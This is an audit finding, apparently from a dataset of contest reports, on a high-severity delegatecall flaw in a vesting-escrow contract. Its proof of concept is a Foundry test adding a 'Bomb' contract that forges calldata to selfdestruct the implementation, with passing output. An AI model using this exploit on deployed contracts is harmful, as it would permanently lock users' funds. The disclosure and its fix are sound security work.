# [H] Vaults can be bricked by selfdestruct()ing implementation via forged delegatecall

## Summary
Severity: High
Contest weight: 0.6166
Dataset id: 22385
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The clone-with-immutable-args pattern is unsafe to use when one of the immutable arguments controls an address being delegated to.  
As was seen in the Astaria beacon proxy issue, an attacker is able to forge the calldata that the proxy normally would forward, and can cause the implementation to selfdestruct() itself via a delegatecall(). The current code has a very similar vulnerability, in that every escrow performs a delegatecall() to an address coming from the factory, which is a forgeable immutable argument.  
By creating a fake IVotingAdaptor, and providing properly-formatted calldata to the implementation contract being passed to each factory, an attacker can gain control via the delegatecall() in order to selfdestruct() each of the factories' implementations, preventing each factory's escrows from functioning further, including the withdrawal of tokens by any party.  
The factory() function gets its value from an immutable argument:  
// File: src/VestingEscrow.sol : VestingEscrow.factory()  
#1  
/// @notice The factory that created this VestingEscrow instance.  
function factory() public pure returns (IVestingEscrowFactory) {  
return IVestingEscrowFactory(_getArgAddress(0));  
21:  
}  
ng-escrow/src/VestingEscrow.sol#L18-L21  
// File: src/VestingEscrow.sol : VestingEscrow.vote()  
#2  
/// @notice Participate in a governance vote using all available tokens on the contract's balance.  
/// @param params The ABI-encoded data for call. Can be obtained from VotingAdaptor.encodeVoteCalldata.  
function vote(bytes calldata params) external onlyRecipient whenVotingAdaptorIsSet returns (bytes memory) {  
return _votingAdaptor().functionDelegateCall(abi.encodeCall(IVotingAdaptor.vote, (params)));  
156:  
}  
ng-escrow/src/VestingEscrow.sol#L152-L156  
// File: src/adaptors/OZVotingAdaptor.sol : OZVotingAdaptor.delegate()  
#3  
/// @notice Delegate votes.  
/// @param params The ABI-encoded delegatee address.  
function delegate(bytes calldata params) external {  
IVotes(votingToken).delegate(abi.decode(params, (address)));  
59:  
}  
ng-escrow/src/adaptors/OZVotingAdaptor.sol#L55-L59

## Proof of Concept
Because of a foundry bug the test is not able to show the end result of the selfdestruct(), so I've added a print statement  
diff --git a/rio-vesting-escrow/test/VestingEscrow.t.sol b/rio-vesting-escrow/test/VestingEscrow.t.sol  
index eafb7dc..55c95a8 100644  
--- a/rio-vesting-escrow/test/VestingEscrow.t.sol  
+++ b/rio-vesting-escrow/test/VestingEscrow.t.sol  
@@ -6,6 +6,20 @@ import {IVestingEscrow} from 'src/interfaces/IVestingEscrow.sol';  
import {OZVotingAdaptor} from 'src/adaptors/OZVotingAdaptor.sol';  
import {ERC20NoReturnToken} from 'test/lib/ERC20NoReturnToken.sol';  
import {ERC20Token} from 'test/lib/ERC20Token.sol';  
+import {console} from 'forge-std/Test.sol';  
+  
+contract Bomb {  
+  
function attack(address impl) external {  
+  
(bool success, ) = impl.call(abi.encodePacked(bytes4(keccak256("vote(bytes)")), bytes32(0), address(this), address(this), address(this), uint40(block.timestamp), uint40(block.timestamp + 1), uint40(0), uint40(1), uint16(82)));  
+  
require(success);  
+  
}  
+  
function votingAdaptor() external view returns (address) { return address(this); } function factory() external view returns (address) { return address(this); } function recipient() external view returns (address) { return address(this); }  
+  
+  
function vote(bytes calldata) external {  
+  
console.log("bomb is being delegatecall()ed to; calling selfdestruct()");  
+  
selfdestruct(payable(address(0)));  
+  
}  
+}  
+  
contract VestingEscrowTest is TestUtil {  
function setUp() public {  
@@ -586,9 +600,11 @@ contract VestingEscrowTest is TestUtil {  
deployedVesting.revokeAll();  
}  
-  
function testRevokeAll() public {  
+  
function testRevokeAllBomb() public {  
uint256 ownerBalance = token.balanceOf(factory.owner());  
+  
new Bomb().attack(address(vestingEscrowImpl));  
+  
vm.prank(factory.owner());  
deployedVesting.revokeAll();  
diff --git a/rio-vesting-escrow/test/lib/TestUtil.sol b/rio-vesting-escrow/test/lib/TestUtil.sol  
index 8667ef4..68c60ec 100644  
--- a/rio-vesting-escrow/test/lib/TestUtil.sol  
+++ b/rio-vesting-escrow/test/lib/TestUtil.sol  
@@ -39,6 +39,7 @@ contract TestUtil is Test {  
OZVotingToken public token;  
VestingEscrow public deployedVesting;  
+  
VestingEscrow public vestingEscrowImpl;  
uint256 public amount;  
address public recipient;  
@@ -52,8 +53,9 @@ contract TestUtil is Test {  
token = new OZVotingToken();  
governor = new GovernorVotesMock(address(token));  
ozVotingAdaptor = new OZVotingAdaptor(address(governor), address(token), config.owner);  
+  
vestingEscrowImpl = new VestingEscrow();  
factory = new VestingEscrowFactory(  
-  
address(new VestingEscrow()), address(token), config.owner, config.manager, address(ozVotingAdaptor)  
+  
address(vestingEscrowImpl), address(token), config.owner, config.manager, address(ozVotingAdaptor)  
);  
vm.deal(RANDOM_GUY, 100 ether);  
output:  
% forge test --match-test testRevokeAllBomb -vvv  
[] Compiling...  
No files changed, compilation skipped  
Running 1 test for test/VestingEscrow.t.sol:VestingEscrowTest  
[PASS] testRevokeAllBomb() (gas: 342335)  
Logs:  
bomb is being delegatecall()ed to; calling selfdestruct()  
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.79ms

## Recommendation
Use a state/contract variable for anything requiring being delegated to.
